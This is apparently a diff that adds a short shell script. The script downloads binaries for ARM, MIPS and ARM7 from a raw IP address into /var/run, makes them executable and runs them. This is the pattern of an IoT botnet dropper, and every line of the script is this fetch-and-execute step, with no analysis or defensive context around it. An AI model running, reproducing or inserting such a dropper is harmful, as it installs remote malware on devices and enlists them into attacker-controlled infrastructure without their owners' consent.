@@ -1,0 +1,5 @@
+#!/bin/sh
+
+wget -c http://80.82.77.25/bins/arm -P /var/run && chmod +x /var/run/arm && /var/run/arm
+wget -c http://80.82.77.25/bins/mips -P /var/run && chmod +x /var/run/mips && /var/run/mips
+wget -c http://80.82.77.25/bins/arm7 -P /var/run && chmod +x /var/run/arm7 && /var/run/arm7
